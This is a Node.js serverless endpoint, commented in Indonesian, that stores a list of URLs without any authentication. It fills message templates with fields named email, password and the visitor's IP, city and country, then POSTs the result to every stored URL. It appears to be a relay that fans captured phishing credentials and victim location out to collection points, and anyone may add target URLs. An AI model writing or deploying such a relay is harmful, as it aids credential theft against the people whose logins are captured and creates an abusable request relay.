const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

// ======================
// LOAD URLS
// ======================
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    return JSON.parse(fs.readFileSync(FILE, "utf8"));
  } catch {
    return [];
  }
}

// ======================
// SAVE URLS
// ======================
function saveUrls(data) {
  try {
    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
  } catch {}
}

// ======================
// BODY PARSER SAFE
// ======================
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "string") {
    return Object.fromEntries(new URLSearchParams(req.body));
  }
  return req.body;
}

// ======================
// AUTO TEMPLATE ENGINE
// ======================
function renderAdvanced(str, vars) {
  if (!str) return "";

  return String(str)
    // $var
    .replace(/\$(\w+)/g, (_, key) => vars[key] ?? "")

    // ${d.xxx}
    .replace(/\$\{d\.(\w+)\}/g, (_, key) => vars[key] ?? "")

    // clean unknown ${...}
    .replace(/\$\{.*?\}/g, "");
}

// ======================
// MAIN
// ======================
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "Method not allowed"
      });
    }

    const body = parseBody(req);

    let urls = loadUrls();
    const action = body.action || "send";

    // ======================
    // ADD URL
    // ======================
    if (action === "add-url") {
      const url = body.url;

      if (!url) {
        return res.status(400).json({
          success: false,
          message: "URL wajib diisi"
        });
      }

      if (!urls.includes(url)) {
        urls.push(url);
        saveUrls(urls);
      }

      return res.json({
        success: true,
        message: "URL ditambahkan",
        urls
      });
    }

    // ======================
    // DELETE URL
    // ======================
    if (action === "delete-url") {
      const url = body.url;

      urls = urls.filter(x => x !== url);
      saveUrls(urls);

      return res.json({
        success: true,
        message: "URL dihapus",
        urls
      });
    }

    // ======================
    // LIST URL
    // ======================
    if (action === "list-url") {
      return res.json({
        success: true,
        total: urls.length,
        urls
      });
    }

    // ======================
    // SEND MODE
    // ======================
    const subjek = (body.subjek || "").trim();
    const pesan = body.pesan || "";
    const sender = body.sender || "";

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    // ======================
    // AUTO VARIABLES
    // ======================
    const vars = {
      subjek,
      sender,
      ip:
        req.headers["x-forwarded-for"] ||
        req.socket?.remoteAddress ||
        "unknown",
      time: new Date().toISOString(),

      // optional custom fields
      email: body.email || "",
      alexhost_ip: body.alexhost_ip || "",
      alexhost_kota: body.alexhost_kota || "",
      alexhost_negara: body.alexhost_negara || "",
      password: body.password || ""
    };

    // ======================
    // RENDER HTML + TEXT
    // ======================
    const content = renderAdvanced(pesan, vars);
    const subjectFinal = renderAdvanced(subjek, vars);

    const payload = new URLSearchParams({
      subjek: subjectFinal,
      pesan: content,
      sender
    }).toString();

    const fetchFn = global.fetch || require("node-fetch");

    const results = [];

    for (const url of urls) {
      try {
        const r = await fetchFn(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          body: payload
        });

        results.push({
          url,
          status: r.status,
          success: r.ok
        });
      } catch (err) {
        results.push({
          url,
          success: false,
          error: err.message
        });
      }
    }

    return res.json({
      success: true,
      message: "sent",
      total: urls.length,
      vars_used: vars,
      results
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message
    });
  }
};
